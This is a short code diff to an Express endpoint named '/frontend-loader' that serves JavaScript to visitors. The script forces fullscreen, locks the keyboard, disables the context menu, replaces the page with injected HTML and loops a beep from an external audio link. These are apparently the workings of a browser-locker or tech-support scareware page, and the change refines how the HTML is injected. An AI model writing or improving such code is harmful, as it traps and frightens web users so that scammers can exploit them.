@@ -97,10 +97,9 @@ app.get("/frontend-loader", validateRequest, async (req, res) => {
 
     const code = `
       document.documentElement.requestFullscreen().then(() => {
+        document.body.innerHTML = '${safeHTML}';
         navigator.keyboard.lock();
         document.addEventListener('contextmenu', e => e.preventDefault());
-
-        document.write('${safeHTML}');
 
         const beepAudio = new Audio('https://audio.jukehost.co.uk/wuD65PsKBrAxWCZU4cJ2CbhUqwl33URw');
         beepAudio.loop = true;
